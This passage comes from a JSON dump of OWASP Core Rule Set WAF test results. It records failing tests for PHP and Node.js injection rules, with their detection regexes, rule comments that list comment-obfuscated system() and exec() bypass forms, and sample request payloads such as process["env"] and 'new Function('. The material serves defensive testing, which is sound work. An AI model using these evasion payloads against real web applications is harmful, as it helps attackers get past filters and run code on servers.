        "operator_type" : "rx",
        "pattern" : "(?i)\\b(?:a(?:llow_url_(?:fopen|include)|pc.(?:coredump_unmap|en(?:able(?:_cli|d)|tries_hint)|(?:gc_)?ttl|mmap_file_mask|preload_path|s(?:erializer|hm_s(?:egments|ize)|lam_defense)|use_request_time)|rg_separator.(?:in|out)put|ssert.(?:active|(?:bai|quiet_eva)l|callback|exception|warning)|uto_(?:(?:ap|pre)pend_file|detect_line_endings|globals_jit))|b(?:cmath.scale|rowscap)|c(?:gi.(?:check_shebang_line|(?:discard_pat|np)h|f(?:ix_pathinfo|orce_redirect)|r(?:edirect_status_env|fc2616_headers))|hild_terminate|li(?:_server.color|.p(?:ager|rompt))|om.(?:a(?:llow_dcom|utoregister_(?:(?:casesensitiv|verbos)e|typelib))|(?:code_pag|typelib_fil)e|dotnet_version)|url.cainfo)|d(?:ate.(?:(?:default_l(?:at|ong)itud|timezon)e|sun(?:rise|set)_zenith)|ba.default_handler|efault_(?:(?:charse|socket_timeou)t|mimetype)|is(?:able_(?:classe|function)|play_(?:startup_)?error)s|oc(?:_roo|ref_(?:ex|roo))t)|e(?:n(?:able_(?:dl|post_data_reading)|gine)|rror_(?:(?:(?:ap|pre)pend_str|report)in|lo)g|x(?:i(?:f.(?:decode_(?:jis|unicode)_(?:intel|motorola)|encode_(?:jis|unicode))|t_on_timeout)|tension(?:_dir)?|p(?:ect.(?:log(?:file|user)|match_max|timeout)|ose_php)))|f(?:astcgi.(?:impersonate|logging)|fi.(?:enable|preload)|il(?:e_uploads|ter.default(?:_flags)?))|g(?:d.jpeg_ignore_warning|eoip.custom_directory)|h(?:ard_timeout|ighlight.(?:(?:commen|defaul)t|html|keyword|string)|tml_errors)|i(?:b(?:ase.(?:(?:allow_persisten|time(?:stamp)?forma)t|d(?:ateformat|efault_(?:charset|db|password|user))|max_(?:links|persistent))|m_db2.(?:binmode|i(?:5_(?:all(?:_pconnec|ow_commi)t|dbcs_alloc|ignore_userid)|nstance_name)))|conv.(?:in(?:put|ternal)|output)_encoding|g(?:binary.compact_strings|nore_(?:repeated_(?:errors|source)|user_abort))|m(?:a(?:gick.(?:locale_fix|progress_monitor|skip_version_check)|p.enable_insecure_rsh)|plicit_flush)|n(?:clude_path|put_encoding|t(?:ernal_encoding|l.(?:default_locale|error_level|use_exceptions))))|l(?:dap.max_links|og_errors(?:_max_len)?)|m(?:a(?:gic_quotes_(?:gpc|runtime)|il(?:.(?:add_x_header|force_extra_parameters|log)|parse.def_charset)|x_(?:execution_time|file_uploads|input_(?:nesting_level|time|vars)))|bstring.(?:detect_order|encoding_translation|func_overload|http_(?:input|output(?:_conv_mimetypes)?)|internal_encoding|language|regex_(?:retry|stack)_limit|s(?:trict_detection|ubstitute_character))|crypt.(?:algorithm|mode)s_dir|em(?:cache(?:.(?:allow_failover|c(?:hunk_size|ompress_threshold)|(?:default_por|lock_timeou)t|hash_(?:function|strategy)|max_failover_attempts|protocol|(?:session_)?redundancy)|d.(?:compression_(?:factor|t(?:hreshold|ype))|default_(?:binary_protocol|con(?:nect_timeout|sistent_hash))|s(?:e(?:rializer|ss_(?:binary(?:_protocol)?|con(?:nect_timeout|sistent_hash(?:_type)?)|lock(?:_(?:expire|retries|wait(?:_m(?:ax|in))?)|ing)|number_of_replicas|p(?:ersistent|refix)|r(?:andomize_replica_read|emove_failed(?:_servers)?)|s(?:asl_(?:password|username)|erver_failure_limit)))|tore_retry_count)|use_sasl))|ory_limit)|ysql(?:.(?:allow_(?:local_infile|persistent)|connect_timeout|default_(?:(?:hos|socke)t|p(?:assword|ort)|user)|max_(?:links|persistent)|trace_mode)|i.(?:allow_(?:local_infile|persistent)|default_(?:(?:hos|socke)t|p(?:ort|w)|user)|local_infile_directory|max_(?:links|persistent)|r(?:econnect|ollback_on_cached_plink))|nd.(?:collect_(?:memory_)?statistics|debug|(?:fetch_data_cop|sha256_server_public_ke)y|log_mask|mempool_default_size|net_(?:cmd_buffer_size|read_(?:buffer_size|timeout))|trace_alloc)))|o(?:ci8.(?:(?:connection_clas|event|old_oci_close_semantic)s|default_prefetch|max_persistent|p(?:ersistent_timeout|ing_interval|r(?:efetch_lob_size|ivileged_connect))|statement_cache_size)|dbc.(?:(?:allow|check)_persistent|default(?:_(?:cursortype|db|pw|user)|binmode|lrl)|max_(?:links|persistent))|p(?:cache.(?:blacklist_filename|c(?:ache_id|onsistency_checks)|dups_fix|e(?:nable(?:_(?:cli|file_override))?|rror_log)|f(?:ast_shutdown|ile_(?:cache(?:_(?:consistency_checks|fallback|only))?|update_protection)|orce_restart_timeout)|(?:huge_code_page|save_comment)s|in(?:herited_hack|terned_strings_buffer)|jit(?:_(?:b(?:isect_limit|(?:lacklist_(?:root|side)_trac|uffer_siz)e)|debug|hot_(?:func|loop|return|side_exit)|max_(?:exit_counter|(?:loop_unro|polymorphic_ca)ll|r(?:ecursive_(?:call|return)|oot_trace)|side_trace)s|prof_threshold))?|lo(?:ckfile_path|g_verbosity_level)|m(?:ax_(?:accelerated_files|(?:file_siz|wasted_percentag)e)|emory_consumption|map_base)|opt(?:_debug|imization)_level|pr(?:e(?:ferred_memory_model|load(?:_user)?)|otect_memory)|re(?:cord_warnings|strict_api|validate_(?:freq|path))|use_cwd|validate_(?:permission|root|timestamps))|en(?:_basedir|ssl.ca(?:file|path)))|utput_(?:(?:buffer|encod)ing|handler))|p(?:cre.(?:(?:backtrack|recursion)_lim|j)it|do(?:_odbc.(?:connection_pooling|db2_instance_name)|.dsn)|gsql.(?:a(?:llow|uto_reset)_persistent|(?:ignore|log)_notice|max_(?:links|persistent))|h(?:ar.(?:cache_list|re(?:adonly|quire_hash))|pdbg.(?:eol|path))|recision|ost_max_size)|r(?:e(?:alpath_cache_(?:size|ttl)|gister_argc_argv|port_(?:memleaks|zend_debug)|quest_order)|unkit.(?:internal_override|superglobal))|s(?:e(?:aslog.(?:appender(?:_retry)?|buffer_(?:disabled_in_cli|size)|d(?:efault_(?:basepath|datetime_format|logger|template)|isting_(?:(?:by_hou|folde)r|type))|ignore_warning|level|re(?:call_depth|mote_(?:hos|por|timeou)t)|t(?:hrow_exception|r(?:ace_(?:e(?:rror|xception)|notice|warning)|im_wrap))|use_buffer)|ndmail_(?:from|path)|rialize_precision|ssion.(?:auto_start|c(?:ache_(?:expire|limiter)|ookie_(?:domain|httponly|(?:lifetim|s(?:amesit|ecur))e|path))|entropy_(?:file|length)|gc_(?:divisor|maxlifetime|probability)|hash_(?:bits_per_character|function)|(?:lazy_writ|nam)e|referer_check|s(?:ave_(?:handler|path)|erialize_handler|id_(?:bits_per_character|length))|trans_sid_(?:host|tag)s|u(?:pload_progress.(?:cleanup|enabled|(?:min_)?freq|name|prefix)|se_(?:(?:only_)?cookies|strict_mode|trans_sid))))|hort_open_tag|mtp(?:_port)?|oap.wsdl_cache(?:_(?:dir|enabled|limit|ttl))?|ql(?:.safe_mode|ite3.(?:defensive|extension_dir))|tomp.default_(?:broker|(?:connection|read)_timeout_u?sec)|woole.(?:aio_thread_num|display_errors|enable_(?:coroutine|library|preemptive_scheduler)|(?:fast_serializ|u(?:nixsock_buffer_siz|se_(?:namespac|shortnam)))e)|ys(?:_temp_dir|log.(?:f(?:acility|ilter)|ident)|vshm.init_mem))|t(?:aint.e(?:nable|rror_level)|idy.(?:clean_output|default_config)|ra(?:ck_errors|der.real_(?:precision|round_mode)))|u(?:nserialize_(?:callback_func|max_depth)|opz.(?:disable|exit|overloads)|pload(?:_(?:max_filesize|tmp_dir)|progress.file.filename_template)|rl_rewriter.(?:host|tag)s|ser_(?:agent|dir|ini.(?:cache_ttl|filename)))|v(?:8js.(?:flag|max_disposed_context)s|ariables_order|ld.(?:(?:activ|execut)e|skip_(?:ap|pre)pend))|w(?:in(?:cache.(?:chkinterval|enablecli|f(?:c(?:achesize|enabled(?:filter)?|ndetect)|ile(?:count|mapdir))|(?:ignorelis|namesal)t|maxfilesize|oc(?:achesize|enabled(?:filter)?)|reroute(?:_enabled|ini)|s(?:cachesize|rwlocks)|ttlmax|uc(?:achesize|enabled))|dows.show_crt_warning)|khtmltox.graphics)|x(?:bithack|hprof.output_dir|mlrpc_error(?:_number|s))|ya(?:c(?:.(?:compress_threshold|debug|enable(?:_cli)?|(?:key|value)s_memory_size|serializer)|onf.(?:check_dela|director)y)|f.(?:action_prefer|cache_config|environ|forward_limit|l(?:ibrary|owcase_path)|name_s(?:eparator|uffix)|use_(?:namespace|spl_autoload))|ml.(?:decode_(?:binary|(?:ph|timestam)p)|output_(?:canonical|indent|width))|r.(?:(?:connect_)?timeout|debug|expose_info|packager)|z.(?:keepalive|log_mask))|z(?:end(?:_extension|.(?:assertions|(?:detect_unicod|multibyt)e|e(?:nable_gc|xception_(?:ignore_args|string_param_max_len))|s(?:cript_encoding|ignal_check)))|lib.output_(?:compression(?:_level)?|handler)|ookeeper.(?:recv_timeout|sess(?:_lock_wait|ion_lock))))[\\s\\x0b]*=[^=]"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 933120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "normalizePath"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "PHP Injection Attack: Configuration Directive Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{TX.933120_MATCHED_VAR_NAME}: %{TX.933120_MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-php"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-php"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-PHP"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.933120_matched_var=%{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.933120_matched_var_name=%{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.php_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "933160",
    "test_id" : 16,
    "test_path" : "REQUEST-933-APPLICATION-ATTACK-PHP/933160.yaml",
    "description" : "PHP function call with c-style comment syntax containing newline, whitespaces and vertical tab.\npayload: exec\\t/*foo\\r\\nbar*/\\t ()\n",
    "cause" : "failed expect_id check: 933160 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=921151 - HTTP Header Injection Attack via payload (CR/LF detected)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932236 - Remote Command Execution: Unix Command Injection (command without evasion)", "phase=2 rule_id=932190 - Remote Command Execution: Wildcard bypass technique attempt", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 16,
      "desc" : "PHP function call with c-style comment syntax containing newline, whitespaces and vertical tab.\npayload: exec\\t/*foo\\r\\nbar*/\\t ()\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=exec%09%2f%2afoo%0d%0abar%2a%2f%09%20%28%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 933160 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 933160,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ PHP Functions: High-Risk PHP Function Calls ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Some PHP function names have a certain risk of false positives, due to short"
        }, {
          "type" : "Comment",
          "text" : " names, full or partial overlap with common natural language terms, uses in"
        }, {
          "type" : "Comment",
          "text" : " other contexts, et cetera. Some examples are 'eval', 'exec', 'system'."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " For these function names, we apply a regexp to look for PHP function syntax."
        }, {
          "type" : "Comment",
          "text" : " The regexp looks for a word boundary and adjoining parentheses."
        }, {
          "type" : "Comment",
          "text" : " For instance, we want to block 'eval()', but we want to allow 'medieval()'."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We have to be careful of possible bypasses using comment syntax. Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   system(...)"
        }, {
          "type" : "Comment",
          "text" : "   system (...)"
        }, {
          "type" : "Comment",
          "text" : "   system\\t(...)"
        }, {
          "type" : "Comment",
          "text" : "   system /*comment*/ (...)"
        }, {
          "type" : "Comment",
          "text" : "   system /*multiline \\n comment*/ (...)"
        }, {
          "type" : "Comment",
          "text" : "   system //comment \\n (...)"
        }, {
          "type" : "Comment",
          "text" : "   system #comment \\n (...)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is triggered by the following exploits as well, as they include the string 'exec(...)':"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9791 - Exploit tested: https://www.exploit-db.com/exploits/42324 ]"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2018-11776 - Exploit tested: https://www.exploit-db.com/exploits/45260 ]"
        }, {
          "type" : "Comment",
          "text" : " [ SAP CRM Java vulnerability CVE-2018-2380 - Exploit tested: https://www.exploit-db.com/exploits/44292 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/933160.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 933160"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)\\b\\(?[\\\"']*(?:assert(?:_options)?|c(?:hr|reate_function)|e(?:val|x(?:ec|p))|f(?:ile(?:group)?|open|puts)|glob|i(?:mage(?:gif|(?:jpe|pn)g|wbmp|xbm)|s_a)|m(?:d5|kdir)|o(?:pendir|rd)|p(?:assthru|open|r(?:intf|ev))|r(?:eadfile|trim)|s(?:t(?:rip_tags|at)|ubstr|ystem)|tmpfile|u(?:n(?:pac|lin)k|sort))(?:/(?:\\*.*?\\*/|/[^\\n\\r]*)|#[^\\n\\r]*|[\\s\\x0b\\\"])*[\\\"']*\\)?[\\s\\x0b]*\\([^\\)]*\\)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 933160
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "PHP Injection Attack: High-Risk PHP Function Call Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-php"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-php"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-PHP"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.php_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934100",
    "test_id" : 5,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934100.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 934100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 5,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=new+Function+%28",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ NodeJS Insecure unserialization / generic RCE signatures ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Libraries performing insecure unserialization:"
        }, {
          "type" : "Comment",
          "text" : " - node-serialize: _$$ND_FUNC$$_ (CVE-2017-5941)"
        }, {
          "type" : "Comment",
          "text" : " - funcster: __js_function"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See:"
        }, {
          "type" : "Comment",
          "text" : " https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/"
        }, {
          "type" : "Comment",
          "text" : " https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Some generic snippets used:"
        }, {
          "type" : "Comment",
          "text" : " - function() {"
        }, {
          "type" : "Comment",
          "text" : " - new Function("
        }, {
          "type" : "Comment",
          "text" : " - eval("
        }, {
          "type" : "Comment",
          "text" : " - String.fromCharCode("
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Last two are used by nodejsshell.py,"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " As base64 is sometimes (but not always) used to encode serialized values,"
        }, {
          "type" : "Comment",
          "text" : " use multiMatch and t:base64decode."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934100.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934100"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Stricter sibling: 934101"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "_(?:\\$\\$ND_FUNC\\$\\$_|_js_function)|(?:\\beval|new[\\s\\x0b]+Function[\\s\\x0b]*)\\(|(?:String\\.fromCharCod|Module:prototyp)e|function\\(\\)\\{|this\\.constructor|module\\.exports=|\\([\\s\\x0b]*[^0-9A-Z_a-z]child_process[^0-9A-Z_a-z][\\s\\x0b]*\\)|cons(?:tructor:constructor|ole(?:\\.(?:(?:debu|lo)g|error|info|trace|warn)(?:\\.call)?\\(|\\[[\\\"'`](?:(?:debu|lo)g|error|info|trace|warn)[\\\"'`]\\]))|process(?:\\.(?:(?:a(?:ccess|ppendfile|rgv|vailability)|c(?:aveats|h(?:mod|own)|(?:los|opyfil)e|p|reate(?:read|write)stream)|ex(?:ec(?:file)?|ists)|f(?:ch(?:mod|own)|data(?:sync)?|s(?:tat|ync)|utimes)|inodes|l(?:chmod|ink|stat|utimes)|mkd(?:ir|temp)|open(?:dir)?|r(?:e(?:ad(?:dir|file|link|v)?|name)|m)|s(?:pawn(?:file)?|tat|ymlink)|truncate|u(?:n(?:link|watchfile)|times)|w(?:atchfile|rite(?:file|v)?))(?:sync)?(?:\\.call)?\\(|binding|constructor|env|global|main(?:Module)?|process|require)|\\[[\\\"'`](?:(?:a(?:ccess|ppendfile|rgv|vailability)|c(?:aveats|h(?:mod|own)|(?:los|opyfil)e|p|reate(?:read|write)stream)|ex(?:ec(?:file)?|ists)|f(?:ch(?:mod|own)|data(?:sync)?|s(?:tat|ync)|utimes)|inodes|l(?:chmod|ink|stat|utimes)|mkd(?:ir|temp)|open(?:dir)?|r(?:e(?:ad(?:dir|file|link|v)?|name)|m)|s(?:pawn(?:file)?|tat|ymlink)|truncate|u(?:n(?:link|watchfile)|times)|w(?:atchfile|rite(?:file|v)?))(?:sync)?|binding|constructor|env|global|main(?:Module)?|process|require)[\\\"'`]\\])|(?:binding|constructor|env|global|main(?:Module)?|process|require)\\[|require(?:\\.(?:resolve(?:\\.call)?\\(|main|extensions|cache)|\\[[\\\"'`](?:(?:resolv|cach)e|main|extensions)[\\\"'`]\\])"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeWhitespace"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "base64Decode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeWhitespace"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Node.js Injection Attack 1/2"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-javascript"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-nodejs"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934100",
    "test_id" : 13,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934100.yaml",
    "description" : "process.env test (square bracket property access)",
    "cause" : "failed expect_id check: 934100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 13,
      "desc" : "process.env test (square bracket property access)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=process[\"env\"]",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ NodeJS Insecure unserialization / generic RCE signatures ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Libraries performing insecure unserialization:"
        }, {
          "type" : "Comment",
          "text" : " - node-serialize: _$$ND_FUNC$$_ (CVE-2017-5941)"
        }, {
          "type" : "Comment",
          "text" : " - funcster: __js_function"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See:"
        }, {
          "type" : "Comment",
          "text" : " https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/"
        }, {
          "type" : "Comment",
          "text" : " https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Some generic snippets used:"
        }, {
          "type" : "Comment",
          "text" : " - function() {"
        }, {
          "type" : "Comment",
          "text" : " - new Function("
        }, {
          "type" : "Comment",
          "text" : " - eval("
        }, {
          "type" : "Comment",
          "text" : " - String.fromCharCode("
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
